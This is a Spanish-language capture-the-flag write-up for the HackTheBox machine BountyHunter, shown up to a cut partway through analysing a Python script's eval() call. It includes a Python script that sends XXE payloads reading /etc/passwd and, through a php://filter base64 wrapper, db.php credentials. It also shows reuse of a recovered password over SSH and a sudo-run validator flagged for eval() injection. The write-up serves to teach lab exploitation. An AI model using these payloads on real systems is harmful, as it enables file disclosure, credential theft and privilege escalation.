---
layout      : post
title       : "HackTheBox - BountyHunter"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359banner.png
category    : [ htb ]
tags        : [ Python3-eval(), XXE, code-analysis ]
---
Máquina Linux nivel fácil. Leeremos archivos del sistema mediante un **XXE** con ayuda de **wrappers** e inspeccionaremos código **Python** para juguetear con la funcion **eval()**.

![359bountyhunterHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359bountyhunterHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [ejedev](https://www.hackthebox.eu/profile/280547).

InjeccionAndo.

Nos encontraremos un servidor web con un apartado aún en pruebas enviando data en formato `XML`, ¿qué puede salir mal de eso? Bueno, simplemente que vamos a aprovecharnos de un `XXE` para ver archivos del sistema 😊 

No nos servirá de mucho, ya que muchos archivos son `.php` y en vez de ver su contenido son interpretados, jugaremos con `wrappers` para obtener el contenido en **base64** y posteriormente decodearlo. Así llegaremos al objeto `db.php` el cual tiene credenciales de una base de datos, juntando info de archivos lograremos una sesión en el sistema como el usuario `development`.

Enumerando nuestros permisos veremos que podemos ejecutar un script de `Python` como el usuario `root`, profundizaremos para entender que hace el programa, existe una línea que llama la función `eval()`, jugaremos con ella para que en vez de procesar operaciones aritméticas, nos procese módulos del propio **Python** como el módulo `os`, usándolo podremos spawnear una `/bin/bash` como el usuario `root`.

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359rating.png" style="display: block; margin-left: auto; margin-right: auto; width: 30%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

> Escribo para tener mis "notas", por si algún día se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y éxitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.

...

Elsa yo te juro que te quiero 🎵

1. [Reconocimiento](#reconocimiento).
  * [Descubrimos que puertos están abiertos con **nmap**](#enum-nmap).
2. [Enumeración](#enumeracion).
  * [Vemos que hay alojado en el servidor web (puerto 80)](#puerto-80).
3. [**Explotación**, jugamos con data que viaja en formato **XML**](#explotacion).
  * [Entendemos un poquito sobre **XML** y el ataque **XXE**](#web-xxe-found).
  * [XXE: Leemos archivos (algunos)](#xxe-somefiles).
  * [XXE: Leemos cualquier archivo al que tengamos acceso con el wrapper **php:..base64**](#xxe-anyfile).
4. [**Escalada de privilegios**, tenemos permisos de ejecución sobre un script algo llamativo](#escalada-de-privilegios).
  * [Profundizamos en script de Python para encontrar vulnerabilidad](#debug-py-script).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

...

## Descubrimos puertos con nmap [📌](#enum-nmap) {#enum-nmap}

Empezaremos a descubrir que puertos tiene abiertos la máquina, así vamos direccionando nuestro enfoque, nos apoyaremos de la herramienta `nmap`:

```bash
❱ nmap -p- --open -v 10.10.11.100 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](../../../assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Este escaneo nos devuelve:

```bash
❱ cat initScan
# Nmap 7.80 scan initiated Fri Jul 30 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.11.100
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.100 ()	Status: Up
Host: 10.10.11.100 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Fri Jul 30 25:25:25 2021 -- 1 IP address (1 host up) scanned in 94.26 seconds
```

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Podemos obtener una terminal de manera segura en la máquina. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Nos brinda un servidor web. |

Ya con los puertos TCP que tiene activos la máquina vamos a jugar con otro escaneo, pero en este caso para ver que versiones y scripts están relacionados con cada puerto (servicio):

**~(Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno (no es muy necesario en esta máquina, ya que solo tenemos 2 puertos, pero ¿y si tuviéramos más?**
 
```bash
❱ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.11.100
    [*] Open ports: 22,80

[*] Ports copied to clipboard
```

**)~**

```bash
❱ nmap -p 22,80 -sC -sV 10.10.11.100 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Y obtenemos:

```bash
❱ cat portScan
# Nmap 7.80 scan initiated Fri Jul 30 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.11.100
Nmap scan report for 10.10.11.100
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 30 25:25:25 2021 -- 1 IP address (1 host up) scanned in 17.46 seconds
```

No hay mucho para reseñar:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu |
| 80     | HTTP     | Apache httpd 2.4.41 |

Pues nada, exploremos a ver por donde podemos entrar (:

...

# Enumeración [#](#enumeracion) {#enumeracion}

...

## Puerto 80 [📌](#puerto-80) {#puerto-80}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359page80_2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Una página web sobre personitas que se encargan de encontrar fallos en apps. 

La web cuenta con referencias llamativas como `Can use Burp` y `buffer overflows` jmmmm, sigamos...

Viendo el código fuente de la web, encontramos 2 cosas más:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359page80_htmlcode_portalPHP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Un link hacia un recurso llamado `portal.php` y:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359page80_htmlcode_mailContactMePHP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Una referencia a una configuración para poder enviar emails. Esto puede ser del propio `theme` así que lo tendremos en cuenta, pero no muuuuy en cuenta 😊 

Si damos clic en el link hacia `portal.php` nos encontramos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359page80_portalPHP_underDevelopment.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

"En mantenimiento" 😔, sin embargo, nos provee de otro link hacia `log_submit.php` 😛 veámoslo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359page80_logsubmitPHP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Un formulario (en pruebas aún) para enviar los datos de un exploit encontrado. Si nos fijamos tenemos vaaaarios campos, si los llenamos y damos clic en `Submit` nos responde esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359page80_logsubmitPHP_submit.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Jmmmmmm, habla de una base de datos y de como se guardarían los datos... Bien, empecemos a probar cosas.

Si revisamos el código fuente vemos que todo se esta ejecutando en la web por medio de `JavaScript` y [AJAX](https://lenguajejs.com/javascript/peticiones-http/ajax/) para eso, ejecutar las peticiones en el cliente sin necesidad de recargar la página:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359page80_htmlcode_logsubmitPHP_linkJS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Vemos el link hacia `/resources/bountylog.js`, en su código hay 2 cositas llamativas, ¿las ves antes de decirlas?:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359page80_jscode_bountylog.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Lo primero es que toooooooda la data del formulario esta siendo formateada a [XML](https://rockcontent.com/es/blog/que-es-xml/) (esto nos da entrada a probar ataques como `XPath` o `XXE`) y enviada en **base64** yyyyyyyy que una vez la data sea enviada, viajara hasta un recurso llamado `tracker_diRbPr00f314.php` (en su fuente no hay nada relevante, solo las etiquetas HTML de cada campo y el texto `"If DB were ready, would have added"`.

¿Pero qué te parece el nombre del archivo? La parte final me da mucha impresión de parecer una contraseña, ¿no? (medio feo donde sea, sin embargo, bueno no lo sabemos aún, estamos especulando). 

La cosa es que puede ser o no una contraseña, pero aún no tenemos un usuario a probar, así que tamos F. Juguemos con la data `XML` a veeeeel:

Si llenamos los campos, abrimos `BurpSuite`, levantamos el **proxy** y enviamos la petición, la data viaja así:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359burp_bountysubmit_req.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Lo dicho, la encodea en `base64` y hace la petición contra el recurso con un nombre raro, si decodeamos la cadena para ver que esta viajando, obtenemos:

```xml
❱ echo "PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5ob2xhPC90aXRsZT4KCQk8Y3dlPmNvbW88L2N3ZT4KCQk8Y3Zzcz5lc3RhczwvY3Zzcz4KCQk8cmV3YXJkPnR1PC9yZXdhcmQ+CgkJPC9idWdyZXBvcnQ+" | base64 -d
<?xml  version="1.0" encoding="ISO-8859-1"?>
                <bugreport>
                <title>hola</title>
                <cwe>como</cwe>
                <cvss>estas</cvss>
                <reward>tu</reward>
                </bugreport>
```

Y como respuesta del servidor:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359burp_bountysubmit_res.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

El formateo que vimos antes, pues muy bien (: 

...

# Explotación, jugamos con la data <u>XML</u> [#](#explotacion) {#explotacion}

Para no tener que hacer todo a mano (el encode, probar cosas, pegarlo en **Burp**, etc.) nos creamos un script super rápido que nos ayude:

```py
#!/usr/bin/python3

import requests
import base64

URL = "http://10.10.11.100"

# Zona peligrosa, le damos formato a nuestra data
xml = """<?xml version="1.0" encoding="ISO-8859-1"?>
<bugreport>
    <title>hola</title>
    <cwe>como</cwe>
    <cvss>es</cvss>
    <reward>la fiestaaaaaaa</reward>
</bugreport>"""

# Transformamos a base64
xml_b64 = base64.b64encode(bytes(xml, 'utf-8')).decode('ascii')

# Enviamos la data
r = requests.post(URL + '/tracker_diRbPr00f314.php', data={"data":xml_b64})
print(r.text)
```

Perfecto, si lo ejecutamos nos devuelve lo que vimos en la web y en **burp**, pero con el texto `hola` `como` `es` `la fiesta`, así que tenemos un script funcional.

---

## Entendemos un poquito sobre <u>XML</u> y el ataque <u>XXE</u> [📌](#web-xxe-found) {#web-xxe-found}

Bien, `XML (Extensible Markup Language)`: 

> `XML` seria (en muuuy cortas palabras) un meta-lenguaje encargado de formatear datos e info que posteriormente será procesada. Revisa el post de [openwebinars](https://openwebinars.net/blog/que-es-xml-y-para-que-se-usa/) para más info.

Lo interesante de trabajar con este formato (para nosotros como atacantes) es que existe una vulnerabilidad llamada `XXE (XML External Entity)` la cual (entre muuuchas cosas) nos permite **inyectar código XML** entre el formateo 😮, les dejo un lindo recurso por si quieren profundizar:

* [Los peligros de los ataques XML External Entity (XXE)](https://www.a2secure.com/blog/los-peligros-de-los-ataques-xml-external-entity-xxe/).

Con ayuda del anterior recurso, hacemos una referencia que me gusta mucho:

🤔 ***La inyección ocurre mediante un concepto llamado entidad que almacena cualquier tipo de dato. Esta entidad funciona como el término conocido en programación de variable.*** según [a2secure](https://www.a2secure.com/blog/los-peligros-de-los-ataques-xml-external-entity-xxe/).

Sencillito ¿no? Generamos una entidad (que seria como una "variable") que nos almacene X dato ya ahí simplemente nos quedaría jugar con la entidad ("variable") para mostrar el contenido.

---

## Leemos archivos (algunos) mediante un <u>XXE</u> [📌](#xxe-somefiles) {#xxe-somefiles}

El uso más común es usar la entidad para mediante el `wrapper` `file://` guardar el contenido de un archivo del sistema en ella y posteriormente usar uno de los datos que devuelve la petición para ver el contenido de la entidad (la "variable").

Hay varios recursos con ejemplos, nos quedaremos con [este de **owasp**](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing), este sería el formato para ver archivos del sistema:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359google_owasp_xxe_file.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Crea una entidad llamada `xxe` que guardara el contenido del archivo `/dev/random` y para ver su contenido llama la entidad dentro de la etiqueta `<foo>`. Movamos nuestro script y agreguemos la entidad:

```py
...
# Zona peligrosa, le damos formato a nuestra data
xml = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<bugreport>
    <title>hola</title>
    <cwe>como</cwe>
    <cvss>es</cvss>
    <reward>&xxe;</reward>
</bugreport>"""
...
```

Le decimos que nos cree la entidad `xxe` que guardara el contenido del archivo `/etc/passwd` y nos lo imprimirá en la etiqueta `<reward>`, ejecutemos a veeeeeer:

```bash
❱ python3 formatXML.py
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359bash_script_xxeFileDONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

PERFECTISIMOOOOOOOOOOOOOOOOOO, podemos leer archivos del sistemaaaaaaaaaaa.

Vemos un usuario llamado `development` que tiene acceso a una `bash`, salgamos de dudas con respecto al nombre del archivo que parece una contraseña :P

```bash
❱ ssh development@10.10.11.100
development@10.10.11.100's password: 
Permission denied, please try again.
```

Pero no, no es válida contra él :( así que debemos buscar más archivos e intentar leerlos a ver si encontramos alguna credencial o algo llamativo.

*(También probé a ejecutar comandos con ayuda del wrapper `except`, pero nop, no obtenemos respuesta)*

Podemos ir a ciegas probando archivos que creamos que existen o podemos jugar con un **fuzzeito** a ver que archivos se detectan en el servidor web:

```bash
❱ dirsearch.py -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -u http://10.10.11.100
...
Target: http://10.10.11.100/

[14:30:32] Starting: 
[14:30:33] 200 -   25KB - /index.php
[14:30:37] 200 -   25KB - /.
[14:30:38] 200 -    0B  - /db.php
[14:30:38] 403 -  277B  - /.html
[14:30:39] 200 -  125B  - /portal.php
[14:30:40] 403 -  277B  - /.php
[14:30:46] 403 -  277B  - /.htm
[14:30:48] 403 -  277B  - /.htpasswds
[14:31:13] 403 -  277B  - /wp-forum.phps
[14:31:44] 403 -  277B  - /.htuser
[14:32:10] 403 -  277B  - /.htc
[14:32:10] 403 -  277B  - /.ht
...
```

Listos, el `index.php`, una llamado `db.php` (sin contenido **a mostrar**, por lo que desde la web no veremos nada) el de `portal.php` y los demás que encontramos y enumeramos antes. Pues juguemos con nuestro programa e intentemos ver el contenido del archivo `index.php` (por ejemplo):

🤔 ***Teniendo en cuenta que la mayoría de veces un servidor web en `Linux` esta montado en la carpeta `/var/www/html`, empezaremos a buscar ahí...***

```bash
❱ python3 formatXML.py -f /var/www/html/index.php
```

Pero no nos devuelve ningún resultado :(

---

## Leemos cualquier archivo al que tengamos acceso con ayuda del <u>wrapper base64</u> [📌](#xxe-anyfile) {#xxe-anyfile}

Después de buscar cositas en internet caemos en [este recurso](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/Files/XXE%20PHP%20Wrapper.xml):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359google_payloadall_xxePHPwrapperB64.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Donde se hace uso de un wrapper, distinto al de `file`, ahora se usa uno de `php` que permite ver el contenido de un archivo en `base64`, ya que si intentamos `file` lo que hace la web es interpretar el `PHP` del objeto y no devolvernos el contenido del objeto, pues listo, probemos:

> Así se veria normalmente (lo digo para que no se confundan ahorita que vean el script final)

```py
...
# Zona peligrosa
xml = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]>
<bugreport>
   <title>hola</title>
   <cwe>como</cwe>
   <cvss>es</cvss>
   <reward>&xxe;</reward>
</bugreport>"""
...
```

Si nos fijamos es exactamente igual al de la imagen, solo que nosotros vemos el contenido de la entidad en etiquetas distintas, pero la generación de la entidad es idéntica.

Pues volvamos a intentar:

```bash
❱ python3 formatXML.py -f /var/www/html/index.php
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICAgIDxoZWFkPgogICAgICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgogICAgICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW5rLXRvLWZpdD1ubyIgLz4KICAgICAgICA8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iIiAvPgogICAgICAgIDxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iIiAvPgogICAgICAgIDx0aXRsZT5Cb3VudHkgSHVu
...
ZXNvdXJjZXMvYm9vdHN0cmFwLmJ1bmRsZS5taW4uanMiPjwvc2NyaXB0PgogICAgICAgIDwhLS0gVGhpcmQgcGFydHkgcGx1Z2luIEpTLS0+CiAgICAgICAgPHNjcmlwdCBzcmM9Ii9yZXNvdXJjZXMvanF1ZXJ5LmVhc2luZy5taW4uanMiPjwvc2NyaXB0PgogICAgICAgIDwhLS0gQ29udGFjdCBmb3JtIEpTLS0+CiAgICAgICAgPHNjcmlwdCBzcmM9ImFzc2V0cy9tYWlsL2pxQm9vdHN0cmFwVmFsaWRhdGlvbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdCBzcmM9ImFzc2V0cy9tYWlsL2NvbnRhY3RfbWUuanMiPjwvc2NyaXB0PgogICAgICAgIDwhLS0gQ29yZSB0aGVtZSBKUy0tPgogICAgICAgIDxzY3JpcHQgc3JjPSJqcy9zY3JpcHRzLmpzIj48L3NjcmlwdD4KICAgIDwvYm9keT4KPC9odG1sPgo=
```

Ufff el output es gigante, tomémoslo TOOODO y hagamos esto:

```bash
❱ echo "todo_el_output" | base64 -d > index.php 
```

Esto para guardar la cadena decodeada en un objeto llamado `index.php`, como resultado vemos:

```bash
❱ cat index.php
```

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>Bounty Hunters</title>
        ...
        ...
        ...
        <!-- Core theme JS-->
        <script src="js/scripts.js"></script>
    </body>
</html>
```

Perfectisimo, tenemos toooooooooooodo el contenido del archivo `index.php`, pues ahora movamonos para otros objetos, intentemos ver `db.php`:

```bash
❱ python3 formatXML.py -f /var/www/html/db.php
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359bash_script_xxe_wrapperDBfile.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Hacemos lo mismo de antes yyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359bash_dbPHP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

OPAAAAAAAAAAAAAA unas credenciales de un usuario de la base de datooooooos llamado `admin`, pero ese usuario no existe en el sistema :( F ¿qué hacemos ahora?

Pues sí, podemos intentar **reutilización de contraseñas**, probamos tanto con `development` como con `root` (no creo) a ver si son válidas para alguno:

```bash
❱ ssh development@10.10.11.100
development@10.10.11.100's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
...
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bountyhunter/359bash_ssh_developmentSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Muy bien, estamos dentro del sistema como el usuario `development` (:

...

Les dejo el script que creamos para leer archivos del sistema:

> [formatXMLtoXXE.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/bountyhunter/formatXMLtoXXE.py)

...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

En nuestro `/home` tenemos una "nota":

```bash
development@bountyhunter:~$ cat contract.txt 
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```

Vale, pues muy rico (: el admin (**John**) nos ha dejado una herramienta interna que válida tickets, debemos inspeccionar un fallito, ya que la validación esta fallando :( pues busquemos...

Enumerando los privilegios para ejecutar cositas como otros usuarios, vemos un script:

```bash
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

Podemos ejecutar el script `/opt/skytrain_inc/ticketValidator.py` con `/usr/bin/python3.8` como el usuario `root` :o pues profundicemos en él a ver que nos comenta:

```bash
development@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py
```

```py
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

Opa, varias cositas para mirar, la principal es que hablan de **Tickets** y de **Skytrain Inc**, las dos cadenas también estaban en la nota de **John**, así que esta debe ser la herramienta interna.

Podemos ir directamente a la vuln (¿ya la vieron?) y terminar la máquina, pero neee, muchos se irán sin entender que hace el script y ta feo eso. Así que copiémonos el script a nuestro sistema y debugieeeeemos esto:

---

## Profundizamos en script de Python para encontrar vulnerabilidad [📌](#debug-py-script) {#debug-py-script}

Si quieres ir directamente a la explotación, sigue este link:

➱ [Aprovechamos función del programa para ejecutar instrucciones del sistema operativo](#debug-py-script-eval).

...

👽 ***Modificare 2 variables para que sean más legibles, `x` será la línea del archivo e `i` será la posición de esa línea en el archivo.***

La ejecución principal del programa es esta:

```py
...
def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close
·
main()
```

Primero nos pide la ruta hacia un archivo y la envia a la funcion `load_file()`, veamosla:

```py
...
def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()
...
```

Lo que hace es validar que la ruta al archivo termine con `.md` (o sea un archivo con formato `Markdown`), si es así lo abre y si no, nos dice que el archivo tiene un formato incorrecto y nos debemos ir por la puerta de atrás del programa :(

Probemos, creemos un archivo `.md` y metámosle texto:

```bash
❱ cat estoestacaliente.md
hola

---

prefecto

* dos tres
* cuatro

> cinnnnnncoooooo
```

Ejecutamos el script y para validar que entra, le ponemos un `print("dentro")`:

```py
...
    if loc.endswith(".md"):·
        print("dentro")·      
        return open(loc, 'r')
...
```

```bash
❱ python3 ticketValidator.py 
Please enter the path to the ticket file.
estoestacaliente.md
dentro
```

Bien, prueba sencillita, sigamos... Volvemos a la funcion `main()` con un archivo abierto, se lo enviamos a la funcion `evaluate()`:

```py
def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    result = evaluate(ticket)
    ...
```

Veamosla:

```py
...
def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for pos, line in enumerate(ticketFile.readlines()):
        if pos == 0:
            if not line.startswith("# Skytrain Inc"):
                return False
            continue
...
```

Ahora, empieza a leer el contenido del archivo `ticketFile` (nuestro `estoestacaliente.md`). Guardaremos la posición de la línea en la variable `pos` y el valor de la línea en `line`.

OJOOOO, sí `pos` es igual a `0`, o sea, si estamos en la primera línea del archivo (ya que el bucle empieza a leer desde **0**), válida si esa línea en su texto empieza con `# Skytrain Inc`, si no encuentra esa cadena al inicio nos saca de la ejecución :( así que agreguémosla a nuestro objeto `.md`:

```bash
❱ cat estoestacaliente.md
# Skytrain Inc

hola
...
```

Listo, sigamos... Despues de pasar ese primer `if`, encontramos uno nuevo:

```py
...
if pos == 1:·
    if not line.startswith("## Ticket to "):·
        return False·
    print(f"Destination: {' '.join(line.strip().split(' ')[3:])}")·
    continue
...
```

Bien, parece complicado o confuso, pero nada, es super sencillo:

Si el programa esta en la segunda línea del archivo, válida que su contenido empiece con la cadena `## Ticket to `, si no empieza así, nos vamos pa la casita :( si por el contrario si encuentra ese texto, nos imprime por pantalla el destinatario al que será enviado ese ticket, veamos:

```bash
❱ cat estoestacaliente.md
# Skytrain Inc
## Ticket to lanz pero claro que si

hola
...
```

Vemos la ejecucion del `print` y despues lo desglozamos rapidamente:

```bash
❱ python3 ticketValidator.py 
Please enter the path to the ticket file.
estoestacaliente.md
Destination: lanz pero claro que si
```

Hace esta cadena de lineas:

```bash
❱ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> line = "## Ticket to lanz pero claro que si"
```

* Separa la cadena de texto que hay en 'line' por espacios:

---

```bash
>>> print(' '.join(line.strip()))
# #   T i c k e t   t o   l a n z   p e r o   c l a r o   q u e   s i
```

* Si encuentra un espacio, lo quita: ` ` (un espacio e.e):

---

```bash
>>> print(' '.join(line.strip().split(' ')))
## Ticket to lanz pero claro que si
```

* Extrae de la tercera posicion (contando desde 0) hasta el final:

---

```bash
>>> print(' '.join(line.strip().split(' ')[3:]))
lanz pero claro que si
```

Y ya, concatena esa respuesta a la cadena `Destination: `.

Listo, sigamos...

```py
...
if line.startswith("__Ticket Code:__"):
    code_line = pos+1
    continue
...
```

Si alguna línea diferente a la `0` y la `1` empieza con la cadena `__Ticket Code:__` almacena el valor de la posición de esa línea y le suma uno, ya veremos para que:

```bash
❱ cat estoestacaliente.md
# Skytrain Inc
## Ticket to lanz pero claro que si

__Ticket Code:__
hola
...
```

Seguimos...

```py
...
if code_line and pos == code_line:·
    if not line.startswith("**"):· 
    return False
...
```

Si la variable que acabamos de almacenar tiene contenido yyy si ese contenido (un numero) es igual a la posición en la que estamos del archivo, estaríamos leyendo lo que esta debajo de la cadena `__Ticket Code:__`. 

Si esa línea no empieza con `**` nos saca del programa, así que nuestro archivo quedaría así:

```bash
❱ cat estoestacaliente.md
# Skytrain Inc
## Ticket to lanz pero claro que si

__Ticket Code:__
**
hola
...
```

Bien, ya llegamos al final, la parte peligrooooosa:

```py
...
ticketCode = line.replace("**", "").split("+")[0]
...
```

Toma la linea y remplaza los `**` por nada, o sea, los quita:

```bash
>>> line = "**holacomoestas"
>>> ticketCode = line.replace("**", "")
>>> print(ticketCode)
holacomoestas
```

Peeeero, hace de cuenta que esa línea viene con los símbolos `+` en ella, como "separadores", pues las separa indicándole ese símbolo y se queda con el primer valor:

```bash
>>> line = "**holacomoestas+yo+bien+gracias"
>>> ticketCode = line.replace("**", "")
>>> print(ticketCode)
holacomoestas+yo+bien+gracias
>>> ticketCode = line.replace("**", "").split('+')
>>> print(ticketCode)
['holacomoestas', 'yo', 'bien', 'gracias']
>>> ticketCode = line.replace("**", "").split('+')[0]
>>> print(ticketCode)
holacomoestas
```

Y ahora la parte mas MEEEH (hablo del `if`):

```py
...
if int(ticketCode) % 7 == 4:
